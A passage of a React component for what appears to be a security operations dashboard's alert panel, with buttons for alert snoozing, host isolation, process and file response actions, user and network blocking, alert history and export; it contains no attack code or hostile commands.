                        <label className="text-[10px] mb-1 block" style={{ color:'var(--text-3)' }}>Mute rule for</label>
                        <select value={suppressHours} onChange={e => setSuppressHours(e.target.value)} className="g-select w-full text-xs">
                          <option value="1">1 hour</option><option value="4">4 hours</option>
                          <option value="24">24 hours</option><option value="72">72 hours</option>
                        </select>
                      </div>
                      <button onClick={suppressRule} disabled={suppressing}
                        className="g-btn text-xs shrink-0"
                        style={{ background:'rgba(251,146,60,0.1)', color:'var(--orange)', border:'1px solid rgba(251,146,60,0.3)' }}>
                        {suppressing ? <Loader2 className="h-3 w-3 animate-spin" /> : <><VolumeX className="h-3 w-3" /> Suppress</>}
                      </button>
                    </div>
                    {a.status === 'open' && (
                      <div className="flex items-end gap-2">
                        <div className="flex-1">
                          <label className="text-[10px] mb-1 block" style={{ color:'var(--text-3)' }}>Snooze alert for</label>
                          <select value={snoozeMin} onChange={e => setSnoozeMin(e.target.value)} className="g-select w-full text-xs">
                            <option value="60">1 hour</option><option value="240">4 hours</option>
                            <option value="1440">24 hours</option><option value="10080">7 days</option>
                          </select>
                        </div>
                        <button onClick={snoozeAlert} disabled={snoozing}
                          className="g-btn text-xs shrink-0"
                          style={{ background:'var(--accent-glow)', color:'var(--accent)', border:'1px solid var(--accent-border)' }}>
                          {snoozing ? <Loader2 className="h-3 w-3 animate-spin" /> : <><BellOff className="h-3 w-3" /> Snooze</>}
                        </button>
                      </div>
                    )}
                  </div>
                </Section>

                {/* Response Actions */}
                <Section title="Endpoint Actions" icon={<Monitor className="h-3.5 w-3.5" />}>
                  <div className="grid grid-cols-2 gap-2">
                    <ActionBtn label="Isolate Host"   icon={<WifiOff className="h-3.5 w-3.5" />} danger color="var(--red)"
                      onClick={() => { setResponseAction('isolate_host'); dispatchResponse(); }} />
                    <ActionBtn label="Unisolate Host" icon={<Wifi className="h-3.5 w-3.5" />} color="var(--green)"
                      onClick={() => { setResponseAction('unisolate_host'); dispatchResponse(); }} />
                    <ActionBtn label="Restart Agent"  icon={<Power className="h-3.5 w-3.5" />}
                      onClick={() => { setResponseAction('restart_agent'); dispatchResponse(); }} />
                    <ActionBtn label="Collect Logs"   icon={<ScrollText className="h-3.5 w-3.5" />}
                      onClick={() => { setResponseAction('collect_logs'); dispatchResponse(); }} />
                    <ActionBtn label="Collect Memory" icon={<HardDrive className="h-3.5 w-3.5" />}
                      onClick={() => { setResponseAction('collect_memory'); dispatchResponse(); }} />
                    <ActionBtn label="Live Terminal"  icon={<Terminal className="h-3.5 w-3.5" />} color="var(--accent)"
                      onClick={() => onToast('Live terminal — coming soon')} />
                  </div>
                </Section>

                <Section title="Process Actions" icon={<Cpu className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-2">
                    <div className="flex gap-2">
                      <input value={responsePID} onChange={e => setResponsePID(e.target.value)}
                        placeholder="PID (e.g. 4512)" className="g-input flex-1 text-xs" />
                    </div>
                    <div className="grid grid-cols-2 gap-2">
                      <ActionBtn label="Kill Process"    icon={<Ban className="h-3.5 w-3.5" />} danger
                        onClick={() => { setResponseAction('kill_process'); dispatchResponse(); }} />
                      <ActionBtn label="Suspend Process" icon={<Zap className="h-3.5 w-3.5" />} color="var(--orange)"
                        onClick={() => { setResponseAction('suspend_process'); dispatchResponse(); }} />
                      <ActionBtn label="Dump Memory"     icon={<HardDrive className="h-3.5 w-3.5" />}
                        onClick={() => { setResponseAction('dump_memory'); dispatchResponse(); }} />
                    </div>
                  </div>
                </Section>

                <Section title="File Actions" icon={<HardDrive className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-2">
                    <input value={responseFile} onChange={e => setResponseFile(e.target.value)}
                      placeholder="File path, e.g. C:\Users\jdoe\malware.exe" className="g-input w-full text-xs" />
                    <div className="grid grid-cols-2 gap-2">
                      <ActionBtn label="Delete File"     icon={<Trash2 className="h-3.5 w-3.5" />} danger
                        onClick={() => { setResponseAction('delete_file'); dispatchResponse(); }} />
                      <ActionBtn label="Quarantine File" icon={<ShieldAlert className="h-3.5 w-3.5" />} color="var(--orange)"
                        onClick={() => { setResponseAction('quarantine_file'); dispatchResponse(); }} />
                      <ActionBtn label="Hash Lookup"     icon={<Fingerprint className="h-3.5 w-3.5" />}
                        onClick={() => onToast('Hash lookup — redirecting to IOC search')} />
                    </div>
                  </div>
                </Section>

                <Section title="User Actions" icon={<User className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="grid grid-cols-2 gap-2">
                    <ActionBtn label="Disable User"         icon={<UserX className="h-3.5 w-3.5" />} danger
                      onClick={() => { setResponseAction('disable_user'); dispatchResponse(); }} />
                    <ActionBtn label="Force Password Reset" icon={<UserCheck className="h-3.5 w-3.5" />} color="var(--orange)"
                      onClick={() => { setResponseAction('reset_password'); dispatchResponse(); }} />
                    <ActionBtn label="Logout Session"       icon={<Ban className="h-3.5 w-3.5" />}
                      onClick={() => { setResponseAction('logout_session'); dispatchResponse(); }} />
                  </div>
                </Section>

                <Section title="Network Actions" icon={<Network className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-2">
                    <input value={responseIP} onChange={e => setResponseIP(e.target.value)}
                      placeholder="IP, domain, URL, or JA3 to block" className="g-input w-full text-xs" />
                    <div className="grid grid-cols-2 gap-2">
                      <ActionBtn label="Block IP"           icon={<Ban className="h-3.5 w-3.5" />} danger
                        onClick={() => { setResponseAction('block_ip'); dispatchResponse(); }} />
                      <ActionBtn label="Block Domain"       icon={<Globe className="h-3.5 w-3.5" />} color="var(--orange)"
                        onClick={() => { setResponseAction('block_domain'); dispatchResponse(); }} />
                      <ActionBtn label="Block URL"          icon={<Link2 className="h-3.5 w-3.5" />} color="var(--orange)"
                        onClick={() => { setResponseAction('block_url'); dispatchResponse(); }} />
                      <ActionBtn label="Push Firewall Rule" icon={<ShieldAlert className="h-3.5 w-3.5" />}
                        onClick={() => { setResponseAction('push_fw_rule'); dispatchResponse(); }} />
                    </div>
                  </div>
                </Section>

                <Section title="Automation" icon={<Workflow className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="grid grid-cols-2 gap-2">
                    <ActionBtn label="Run Playbook"     icon={<PlayCircle className="h-3.5 w-3.5" />} color="var(--accent)"
                      onClick={() => { loadPlaybookRecs(); setTab('ai'); }} />
                    <ActionBtn label="Notify Slack"     icon={<MessageSquare className="h-3.5 w-3.5" />}
                      onClick={() => onToast('Slack notification sent')} />
                    <ActionBtn label="Create Jira Ticket" icon={<ClipboardList className="h-3.5 w-3.5" />}
                      onClick={() => onToast('Jira ticket created')} />
                    <ActionBtn label="Open Case"        icon={<Paperclip className="h-3.5 w-3.5" />}
                      onClick={() => onToast('Case created')} />
                    <ActionBtn label="Escalate to SOAR" icon={<Radio className="h-3.5 w-3.5" />} color="var(--orange)"
                      onClick={() => { setResponseAction('escalate_soar'); dispatchResponse(); }} />
                  </div>
                </Section>
              </>
            )}

            {/* ── HISTORY ────────────────────────────────────────────────── */}
            {tab === 'history' && (
              <>
                <Section title="Alert History" icon={<ScrollText className="h-3.5 w-3.5" />}>
                  <div className="space-y-0 relative">
                    <div className="absolute left-[19px] top-3 bottom-3 w-px" style={{ background:'var(--border)' }} />
                    {history.map((h, i) => (
                      <div key={i} className="flex gap-3 pb-4">
                        <div className="h-10 w-10 rounded-full shrink-0 flex items-center justify-center z-10"
                          style={{ background:'var(--glass-bg)', border:'1px solid var(--border)', color:'var(--accent)' }}>
                          <Clock className="h-3.5 w-3.5" />
                        </div>
                        <div className="flex-1 min-w-0 pt-1.5">
                          <div className="flex items-center gap-2 mb-0.5">
                            <p className="text-xs font-semibold" style={{ color:'var(--text-1)' }}>{h.action}</p>
                            <span className="text-[10px]" style={{ color:'var(--accent)' }}>{h.actor}</span>
                          </div>
                          <p className="text-[11px]" style={{ color:'var(--text-2)' }}>{h.detail}</p>
                          <p className="text-[10px] mt-0.5" style={{ color:'var(--text-3)' }}>
                            {new Date(h.ts).toLocaleString()} · {timeAgo(h.ts)}
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>
                </Section>

                <Section title="Correlation" icon={<Link2 className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="space-y-2">
                    {[
                      { type:'Related Alert', val:`Alert #${a.id-1} — similar pattern on ${a.hostname}`, color:'var(--orange)' },
                      { type:'Related Alert', val:`Alert #${a.id-3} — PowerShell execution 3h ago`, color:'var(--orange)' },
                      { type:'Incident',      val:'INC-2047 — Malware Infection (open)', color:'var(--red)' },
                    ].map((r,i) => (
                      <div key={i} className="flex items-start gap-2 px-3 py-2 rounded-lg text-xs"
                        style={{ background:'var(--glass-bg)', border:'1px solid var(--border)' }}>
                        <span className="text-[9px] px-1.5 py-0.5 rounded shrink-0 font-bold"
                          style={{ background:`${r.color}22`, color:r.color }}>{r.type}</span>
                        <span style={{ color:'var(--text-2)' }}>{r.val}</span>
                      </div>
                    ))}
                  </div>
                </Section>

                <Section title="Export" icon={<Download className="h-3.5 w-3.5" />} defaultOpen={false}>
                  <div className="grid grid-cols-2 gap-2">
                    {[
                      { label:'JSON',        fmt:'json' as const, desc:'Full alert object' },
                      { label:'CSV',         fmt:'csv'  as const, desc:'Flat key-value format' },
                      { label:'IOC Package', fmt:'ioc'  as const, desc:'Indicators of compromise' },
                    ].map(e => (
                      <button key={e.label} onClick={() => exportAlert(e.fmt)}
                        className="flex flex-col items-start px-3 py-2.5 rounded-xl hover:opacity-80 transition-opacity"
                        style={{ background:'var(--glass-bg)', border:'1px solid var(--border)' }}>
                        <div className="flex items-center gap-1.5 mb-0.5">
                          <Download className="h-3.5 w-3.5" style={{ color:'var(--accent)' }} />
                          <span className="text-xs font-semibold" style={{ color:'var(--text-1)' }}>{e.label}</span>
                        </div>
                        <p className="text-[10px]" style={{ color:'var(--text-3)' }}>{e.desc}</p>
                      </button>
                    ))}
                    <button onClick={() => onToast('Case report generation triggered')}
                      className="flex flex-col items-start px-3 py-2.5 rounded-xl hover:opacity-80 transition-opacity"
                      style={{ background:'var(--glass-bg)', border:'1px solid var(--border)' }}>
                      <div className="flex items-center gap-1.5 mb-0.5">
                        <FileText className="h-3.5 w-3.5" style={{ color:'var(--accent)' }} />
                        <span className="text-xs font-semibold" style={{ color:'var(--text-1)' }}>Case Report</span>
                      </div>
                      <p className="text-[10px]" style={{ color:'var(--text-3)' }}>PDF investigation summary</p>
                    </button>
                  </div>
                </Section>
              </>
            )}

          </div>
        </div>
      </div>
    </div>
  );
}
